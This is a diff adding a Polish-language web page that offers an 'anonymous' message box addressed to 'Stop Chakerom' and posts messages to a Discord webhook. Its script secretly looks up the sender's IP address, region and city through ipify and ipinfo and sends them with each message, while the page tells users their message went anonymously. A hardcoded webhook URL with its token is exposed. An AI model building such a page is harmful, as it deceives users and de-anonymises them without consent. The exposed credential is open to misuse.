@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anonimowa Wiadomość v2</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        inter: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        discordPurple: '#5865F2',
+                        discordDark: '#23272A', // Darker background
+                        discordDarker: '#1e2124', // Even darker for elements
+                        discordLight: '#99AAB5',
+                        discordGreen: '#43B581',
+                        discordRed: '#F04747',
+                        brandPurple: { // Custom purple palette
+                            light: '#7B61FF',
+                            DEFAULT: '#5865F2',
+                            dark: '#4752C4',
+                        }
+                    },
+                    animation: {
+                        'bounce-slow': 'bounce-slow 3s infinite',
+                        'pulse-subtle': 'pulse-subtle 2.5s infinite ease-in-out',
+                        'slide-in-up': 'slide-in-up 0.5s ease-out forwards',
+                        'fade-in': 'fade-in 0.5s ease-out forwards',
+                    },
+                    keyframes: {
+                        'bounce-slow': {
+                            '0%, 100%': { transform: 'translateY(-6%)', animationTimingFunction: 'cubic-bezier(0.8,0,1,1)' },
+                            '50%': { transform: 'translateY(0)', animationTimingFunction: 'cubic-bezier(0,0,0.2,1)' },
+                        },
+                        'pulse-subtle': {
+                            '0%, 100%': { opacity: '1' },
+                            '50%': { opacity: '0.85' },
+                        },
+                        'slide-in-up': {
+                            '0%': { opacity: '0', transform: 'translateY(20px)' },
+                            '100%': { opacity: '1', transform: 'translateY(0)' },
+                        },
+                        'fade-in': {
+                            '0%': { opacity: '0' },
+                            '100%': { opacity: '1' },
+                        }
+                    },
+                    boxShadow: {
+                        'glow-purple': '0 0 15px 5px rgba(88, 101, 242, 0.4)',
+                        'glow-purple-light': '0 0 10px 2px rgba(123, 97, 255, 0.3)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #23272A; /* discordDark */
+        }
+        /* Custom scrollbar for textarea */
+        textarea::-webkit-scrollbar {
+            width: 10px;
+        }
+        textarea::-webkit-scrollbar-track {
+            background: #2C2F33; /* discordDark */
+            border-radius: 10px;
+        }
+        textarea::-webkit-scrollbar-thumb {
+            background: #5865F2; /* discordPurple */
+            border-radius: 10px;
+            border: 2px solid #2C2F33; /* discordDark */
+        }
+        textarea::-webkit-scrollbar-thumb:hover {
+            background: #4752C4; /* brandPurple.dark */
+        }
+
+        .glassmorphism {
+            background: rgba(44, 47, 51, 0.6); /* discordDark with opacity */
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .button-cooldown {
+            background-color: #72767d !important; /* Discord grey */
+            cursor: not-allowed !important;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-discordDark via-discordDarker to-black">
+    <div class="glassmorphism p-6 sm:p-10 rounded-2xl shadow-2xl w-full max-w-lg transform transition-all duration-500 hover:scale-[1.02] hover:shadow-glow-purple">
+        <div class="text-center mb-8 animate-fade-in">
+            <svg class="mx-auto h-20 w-20 text-brandPurple-light animate-bounce-slow" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.477 2 2 6.477 2 12C2 17.523 6.477 22 12 22C17.523 22 22 17.523 22 12C22 6.477 17.523 2 12 2ZM11.293 7.293C11.683 6.902 12.317 6.902 12.707 7.293L16.707 11.293C17.098 11.683 17.098 12.317 16.707 12.707L12.707 16.707C12.317 17.098 11.683 17.098 11.293 16.707L7.293 12.707C6.902 12.317 6.902 11.683 7.293 11.293ZM12 10C11.448 10 11 10.448 11 11V13C11 13.552 11.448 14 12 14C12.552 14 13 13.552 13 13V11C13 10.448 12.552 10 12 10ZM12 15C11.448 15 11 15.448 11 16C11 16.552 11.448 17 12 17C12.552 17 13 16.552 13 16C13 15.448 12.552 15 12 15Z"/>
+            </svg>
+            <h1 class="text-4xl sm:text-5xl font-extrabold text-white mt-6">Anonimowa Skrzynka</h1>
+            <p class="text-discordLight mt-3 text-lg">Wyślij anonimową wiadomość do <span class="font-semibold text-brandPurple-light">Stop Chakerom</span></p>
+        </div>
+
+        <form id="webhookForm" class="space-y-7 animate-slide-in-up" style="animation-delay: 0.2s;">
+            <div>
+                <label for="messageContent" class="block text-base font-medium text-discordLight mb-2">Twoja Wiadomość:</label>
+                <textarea
+                    id="messageContent"
+                    name="messageContent"
+                    rows="8"
+                    placeholder="Wpisz swoją anonimową wiadomość tutaj... Bądź kreatywny!"
+                    required
+                    class="block w-full px-4 py-3 bg-discordDarker border border-gray-700 rounded-xl shadow-sm text-gray-200 placeholder-gray-500 focus:ring-2 focus:ring-brandPurple focus:border-brandPurple sm:text-base resize-y transition duration-200 ease-in-out transform focus:scale-[1.01] focus:shadow-glow-purple-light"
+                ></textarea>
+            </div>
+
+            <button
+                id="submitButton"
+                type="submit"
+                class="w-full flex justify-center items-center py-3.5 px-4 border border-transparent rounded-xl shadow-lg text-xl font-semibold text-white bg-brandPurple hover:bg-brandPurple-dark focus:outline-none focus:ring-3 focus:ring-offset-2 focus:ring-offset-discordDarker focus:ring-brandPurple transition-all duration-200 ease-in-out transform hover:scale-105 active:scale-95 group"
+            >
+                <svg class="w-6 h-6 mr-2.5 -ml-1 group-hover:rotate-[10deg] transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path></svg>
+                <span id="buttonText">Wyślij Anonimowo</span>
+            </button>
+        </form>
+
+        <div id="messageStatus" class="mt-8 p-5 rounded-xl text-center text-lg font-medium opacity-0 transition-all duration-500 ease-in-out max-h-0 overflow-hidden">
+            </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1376649264763240569/N55yq2-Sc3SaKZQft2VBNnHvBR-umGQAdHoiMzBTxcruhON5NvSdr0gp5t1nKazzWk5Q"; // Zastąp tym swoim rzeczywistym URL-em webhooka Discorda
+
+            const webhookForm = document.getElementById('webhookForm');
+            const messageContentInput = document.getElementById('messageContent');
+            const messageStatusDiv = document.getElementById('messageStatus');
+            const submitButton = document.getElementById('submitButton');
+            const buttonText = document.getElementById('buttonText');
+
+            let cooldownActive = false;
+            let cooldownTimer = null;
+            const COOLDOWN_SECONDS = 10; // Czas odnowienia w sekundach
+
+            // Funkcja do wyświetlania statusu wiadomości
+            const showMessageStatus = (message, type) => {
+                messageStatusDiv.textContent = message;
+                messageStatusDiv.className = `mt-8 p-5 rounded-xl text-center text-lg font-medium transition-all duration-500 ease-in-out max-h-full overflow-visible opacity-100 ${
+                    type === 'success' ? 'bg-discordGreen/20 text-discordGreen' :
+                    type === 'error' ? 'bg-discordRed/20 text-discordRed' :
+                    'bg-gray-700/20 text-gray-300'
+                }`;
+                // Ukryj wiadomość po 5 sekundach
+                setTimeout(() => {
+                    messageStatusDiv.className = 'mt-8 p-5 rounded-xl text-center text-lg font-medium opacity-0 transition-all duration-500 ease-in-out max-h-0 overflow-hidden';
+                }, 5000);
+            };
+
+            // Funkcja do aktywacji/dezaktywacji przycisku i odliczania
+            const setButtonCooldown = (active) => {
+                cooldownActive = active;
+                if (active) {
+                    submitButton.classList.add('button-cooldown');
+                    submitButton.disabled = true;
+                    let timeLeft = COOLDOWN_SECONDS;
+                    buttonText.textContent = `Poczekaj (${timeLeft}s)`;
+
+                    cooldownTimer = setInterval(() => {
+                        timeLeft--;
+                        if (timeLeft > 0) {
+                            buttonText.textContent = `Poczekaj (${timeLeft}s)`;
+                        } else {
+                            clearInterval(cooldownTimer);
+                            setButtonCooldown(false);
+                        }
+                    }, 1000);
+                } else {
+                    submitButton.classList.remove('button-cooldown');
+                    submitButton.disabled = false;
+                    buttonText.textContent = 'Wyślij Anonimowo';
+                    if (cooldownTimer) {
+                        clearInterval(cooldownTimer);
+                    }
+                }
+            };
+
+            // Funkcja do pobierania adresu IP z api.ipify.org i danych geolokalizacyjnych z ipinfo.io
+            const getIPAndGeoData = async () => {
+                let ip = 'Nieznany';
+                let region = 'Niedostępne';
+                let city = 'Niedostępne';
+
+                try {
+                    // Pobierz IP z api.ipify.org
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    if (!ipResponse.ok) {
+                        throw new Error(`Błąd HTTP z ipify.org: ${ipResponse.status}`);
+                    }
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip;
+
+                    // Użyj uzyskanego IP do pobrania danych geolokalizacyjnych z ipinfo.io
+                    // ipinfo.io pozwala na zapytanie o konkretny IP, np. https://ipinfo.io/8.8.8.8/json
+                    const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+                    if (!geoResponse.ok) {
+                        throw new Error(`Błąd HTTP z ipinfo.io: ${geoResponse.status}`);
+                    }
+                    const geoDataFromApi = await geoResponse.json();
+
+                    // Sprawdź, czy dane są dostępne i przypisz je
+                    if (geoDataFromApi.region) {
+                        region = geoDataFromApi.region;
+                    }
+                    if (geoDataFromApi.city) {
+                        city = geoDataFromApi.city;
+                    }
+
+                } catch (error) {
+                    console.error('Błąd podczas pobierania adresu IP lub danych geolokalizacyjnych:', error);
+                }
+
+                return { ip, region, city };
+            };
+
+            // Obsługa wysyłania formularza
+            webhookForm.addEventListener('submit', async (e) => {
+                e.preventDefault(); // Zapobiegaj domyślnej wysyłce formularza
+
+                if (cooldownActive) {
+                    showMessageStatus('Proszę poczekać przed wysłaniem kolejnej wiadomości.', 'info');
+                    return;
+                }
+
+                const messageContent = messageContentInput.value.trim();
+                if (!messageContent) {
+                    showMessageStatus('Wiadomość nie może być pusta!', 'error');
+                    return;
+                }
+
+                setButtonCooldown(true); // Aktywuj odnowienie
+
+                const geoData = await getIPAndGeoData(); // Pobierz adres IP, region i miasto
+
+                // Tworzenie ładunku dla webhooka Discorda z osadzonymi wiadomościami (embeds)
+                const payload = {
+                    username: "Anonimowy Nadawca",
+                    avatar_url: "https://placehold.co/128x128/5865F2/ffffff?text=Anonim", // Prosty awatar placeholder
+                    embeds: [
+                        {
+                            title: "Nowa Anonimowa Wiadomość",
+                            description: messageContent,
+                            color: parseInt('5865F2', 16), // Kolor DiscordPurple w formacie dziesiętnym
+                            fields: [
+                                {
+                                    name: "Adres IP",
+                                    value: `\`${geoData.ip}\``,
+                                    inline: true
+                                },
+                                {
+                                    name: "Region",
+                                    value: `\`${geoData.region}\``,
+                                    inline: true
+                                },
+                                {
+                                    name: "Miasto",
+                                    value: `\`${geoData.city}\``,
+                                    inline: true
+                                }
+                            ],
+                            timestamp: new Date().toISOString() // Aktualny czas w formacie ISO 8601
+                        }
+                    ]
+                };
+
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+
+                    if (response.ok) {
+                        showMessageStatus('Wiadomość została wysłana anonimowo!', 'success');
+                        messageContentInput.value = ''; // Wyczyść pole wiadomości
+                    } else {
+                        const errorData = await response.json();
+                        console.error('Błąd wysyłania wiadomości:', response.status, errorData);
+                        showMessageStatus(`Błąd podczas wysyłania wiadomości: ${response.status} - ${errorData.message || 'Nieznany błąd'}`, 'error');
+                    }
+                } catch (error) {
+                    console.error('Błąd sieci lub inny błąd:', error);
+                    showMessageStatus('Wystąpił błąd sieci. Sprawdź swoje połączenie.', 'error');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
